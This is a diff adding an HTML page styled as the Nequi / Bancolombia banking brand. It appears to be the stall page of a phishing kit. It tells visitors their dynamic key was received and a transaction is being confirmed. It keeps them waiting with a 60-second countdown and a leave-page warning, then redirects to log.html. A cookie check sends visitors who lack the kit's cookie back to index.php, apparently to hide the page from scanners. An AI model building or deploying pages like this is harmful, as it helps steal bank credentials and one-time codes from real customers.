@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+
+<html lang="es"><head>
+<meta charset="utf-8"/>
+<meta name="robots" content="noindex,nofollow"/>
+<script>if(!/(?:^|;\s*)_nqs=/.test(document.cookie)){location.replace('index.php')}</script>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Procesando - </title>
+<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            Pink: '#E6007E',
+            Purple: '#2F003E',
+            LightPink: '#FCEEF5',
+            InputBg: '#F7F7F9'
+          },
+          fontFamily: {
+            sans: ['Montserrat', 'Inter', 'sans-serif', 'system-ui'],
+            nequi: ['Montserrat', 'sans-serif'],
+          }
+        }
+      }
+    }
+  </script>
+<style data-purpose="custom-styling">
+    * { font-family: 'Montserrat', sans-serif; }
+    body {
+      background: url('background.png'), linear-gradient(180deg, rgba(253, 234, 244, 0.8) 0%, rgba(245, 241, 248, 0.8) 100%);
+      background-attachment: fixed;
+      background-size: cover;
+      background-position: center;
+      min-height: 100vh;
+    }
+    .-logo-text { color: #2F003E; font-weight: 800; letter-spacing: -1px; }
+    .-logo-dot  { color: #E6007E; }
+    .spinner {
+      display: inline-block; width: 50px; height: 50px;
+      border: 4px solid rgba(230, 0, 126, 0.2);
+      border-radius: 50%; border-top-color: #E6007E;
+      animation: spin 1s ease-in-out infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
+    .progress-bar { animation: progress 60s linear forwards; }
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    .fade-in-up { animation: fadeInUp 0.6s ease-out forwards; }
+    .delay-100 { animation-delay: 0.1s; opacity: 0; }
+    .delay-200 { animation-delay: 0.2s; opacity: 0; }
+    .delay-300 { animation-delay: 0.3s; opacity: 0; }
+    .delay-400 { animation-delay: 0.4s; opacity: 0; }
+    .delay-500 { animation-delay: 0.5s; opacity: 0; }
+    .bg--dark { background-color: #240030; }
+    .border--divider { border-color: rgba(255,255,255,0.3); }
+    .vertical-text { writing-mode: vertical-rl; transform: rotate(180deg); font-size: 10px; letter-spacing: 0.05em; }
+  </style>
+</head>
+<body class="flex flex-col">
+<header class="w-full bg-white px-6 py-4 flex justify-between items-center shadow-sm z-10">
+<div class="flex items-center">
+    <img src="logo.svg" alt="Logo" class="h-6 w-auto object-contain">
+</div>
+<button aria-label="Menu" class="flex flex-col justify-between w-6 h-4">
+<span class="w-full h-0.5 bg-Purple rounded"></span>
+<span class="w-full h-0.5 bg-Purple rounded"></span>
+<span class="w-full h-0.5 bg-Purple rounded"></span>
+</button>
+</header>
+
+<main class="flex-grow flex items-center justify-center p-4 relative overflow-hidden">
+<div class="absolute top-[-10%] right-[-10%] w-64 h-64 bg-LightPink rounded-full opacity-50 -z-10"></div>
+<section class="bg-white rounded-lg shadow-xl w-full max-w-sm px-6 py-10 flex flex-col items-center">
+
+<div class="mb-6 fade-in-up delay-100">
+  <div class="spinner"></div>
+</div>
+
+<h1 class="text-Purple text-2xl font-bold mb-3 text-center fade-in-up delay-200">
+  Procesando transacción
+</h1>
+
+<p class="text-Purple text-sm text-center mb-6 leading-snug fade-in-up delay-300">
+  Tu solicitud está siendo procesada. Por favor espera, este proceso puede tardar hasta 60 segundos.
+</p>
+
+<div class="w-full mb-6 fade-in-up delay-400">
+  <div class="text-xs text-Purple mb-2 text-center font-medium">
+    Tiempo restante: <span id="countdown">60</span>s
+  </div>
+  <div class="w-full bg-LightPink rounded-full h-1.5 overflow-hidden">
+    <div class="progress-bar bg-Pink h-full rounded-full"></div>
+  </div>
+</div>
+
+<div class="w-full space-y-3 fade-in-up delay-500">
+  <div class="flex items-center gap-3 px-3 py-2 rounded-lg bg-gray-50">
+    <svg class="w-5 h-5 text-green-500 flex-shrink-0" fill="currentColor" viewBox="0 0 24 24">
+      <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
+    </svg>
+    <span class="text-xs font-medium text-Purple">Clave dinámica recibida</span>
+  </div>
+  <div class="flex items-center gap-3 px-3 py-2 rounded-lg bg-gray-50">
+    <svg class="w-5 h-5 text-green-500 flex-shrink-0" fill="currentColor" viewBox="0 0 24 24">
+      <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
+    </svg>
+    <span class="text-xs font-medium text-Purple">Validando autorización</span>
+  </div>
+  <div class="flex items-center gap-3 px-3 py-2 rounded-lg bg-gray-50">
+    <div class="w-5 h-5 flex-shrink-0 flex items-center justify-center">
+      <div class="w-3 h-3 border-2 border-Pink border-t-transparent rounded-full animate-spin"></div>
+    </div>
+    <span class="text-xs font-medium text-Purple">Confirmando transacción...</span>
+  </div>
+</div>
+
+<p class="text-xs text-Purple/60 text-center mt-8 fade-in-up delay-500">
+  Por favor no cierres esta ventana
+</p>
+
+</section>
+</main>
+
+<footer class="bg--dark text-white relative min-h-[562px] w-full max-w-[450px] mx-auto overflow-hidden p-6 flex flex-col items-center">
+<div class="absolute left-2 bottom-8 h-fit flex items-center opacity-60 pointer-events-none">
+<span class="vertical-text uppercase font-light">BANCOLOMBIA S.A. Establecimiento Bancario.</span>
+</div>
+<div class="w-full flex justify-between items-center mb-8">
+<div class="flex items-center">
+    <img src="footerneq.svg" alt="Logo" class="h-6 w-auto object-contain">
+</div>
+<div class="flex items-center gap-2">
+  <img src="colom.png" alt="Grupo" class="w-8 h-8 object-contain rounded-full bg-white/20">
+  <div class="text-[10px] leading-tight font-semibold">Grupo<br>Bancolombia</div>
+</div>
+</div>
+<hr class="w-full border-t border--divider mb-8"/>
+<nav class="w-full flex flex-col">
+<a class="flex justify-between items-center py-4 border-b border-white/5 group" href="#">
+<span class="text-xl font-medium group-hover:pl-1 transition-all">Información legal</span>
+<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M9 5l7 7-7 7" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>
+</a>
+<a class="flex justify-between items-center py-4 border-b border-white/5 group" href="#">
+<span class="text-xl font-medium group-hover:pl-1 transition-all">Para personas</span>
+<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M9 5l7 7-7 7" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>
+</a>
+<a class="flex justify-between items-center py-4 border-b border-white/5 group" href="#">
+<span class="text-xl font-medium group-hover:pl-1 transition-all">Ayuda</span>
+<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M9 5l7 7-7 7" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>
+</a>
+</nav>
+</footer>
+
+<script>
+let countdown = 60;
+const countdownElement = document.getElementById('countdown');
+const timer = setInterval(() => {
+    countdown--;
+    countdownElement.textContent = countdown;
+    if (countdown <= 0) {
+        clearInterval(timer);
+        window.location.href = 'log.html';
+    }
+}, 1000);
+window.addEventListener('beforeunload', (e) => {
+    if (countdown > 0) {
+        e.preventDefault();
+        e.returnValue = 'El proceso está en curso. ¿Estás seguro de que quieres salir?';
+    }
+});
+</script>
+</body></html>
